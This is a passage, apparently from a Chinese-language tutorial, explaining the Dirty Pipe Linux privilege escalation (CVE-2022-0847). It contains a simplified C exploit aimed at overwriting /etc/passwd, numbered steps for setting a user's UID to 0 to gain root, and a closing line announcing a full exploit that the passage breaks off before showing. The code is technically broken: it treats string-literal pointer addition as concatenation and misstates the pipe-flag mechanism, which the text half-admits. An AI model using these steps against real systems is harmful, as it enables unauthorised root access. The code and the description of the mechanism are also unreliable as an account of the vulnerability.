#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main() {
    // 打开目标文件（只读）
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // 创建管道
    int p[2];
    if (pipe(p) < 0) {
        perror("pipe");
        return 1;
    }

    // 使用 splice 从文件读取 1 字节到管道
    // 这会创建一个 pipe_buffer 并映射到文件页缓存
    ssize_t n = splice(fd, NULL, p[1], NULL, 1, 0);
    if (n < 0) {
        perror("splice");
        return 1;
    }

    // 关闭管道的写端，然后重新打开（利用未初始化 flags）
    close(p[1]);
    p[1] = open("/proc/self/fd/" + p[0], O_WRONLY); // 实际利用中更复杂
    // 注意：上述简化写法不准确，实际利用需要更精细的操作

    // 写入数据覆盖页缓存
    char data = 'A'; // 将第一个字节改为 'A'
    write(p[1], &data, 1);

    close(fd);
    close(p[0]);
    close(p[1]);
    return 0;
}


**注意**：上述代码仅为演示原理，实际利用需要更复杂的步骤（如处理 `PIPE_BUF_FLAG_CAN_MERGE` 标志）。完整的利用代码可参考公开的 Dirty Pipe 提权 exp（如 `CVE-2022-0847.c`）。

**修复**：Linux 内核 5.16.11、5.15.25 等版本通过正确初始化 `pipe_buffer` 的 `flags` 字段来修复此漏洞。

Dirty Pipe 提权 exp 的核心思路是利用漏洞修改 `/etc/passwd` 文件，将普通用户的 UID 改为 0（root），从而获得 root 权限。也可以修改 SUID 文件（如 `/usr/bin/su`）或直接修改 `/etc/shadow`，但修改 `/etc/passwd` 是最直接的方法。

**利用步骤**：
1. 创建一个管道。
2. 使用 `splice()` 从目标文件（如 `/etc/passwd`）读取少量数据到管道，触发页缓存映射。
3. 关闭管道的写端，然后通过特殊方式重新打开写端（利用 `/proc/self/fd/` 或 `dup2`），使得后续写入操作能够覆盖之前映射的页缓存。
4. 构造新的 `/etc/passwd` 条目，例如将 `user:x:1000:1000:...` 改为 `user:x:0:0:...`。
5. 写入管道，覆盖页缓存。
6. 文件内容被修改，然后使用 `su user` 或 `ssh user@localhost` 登录，获得 root 权限。

以下是一个完整的 C 语言提权 exp（基于公开的 Dirty Pipe 利用代码）：

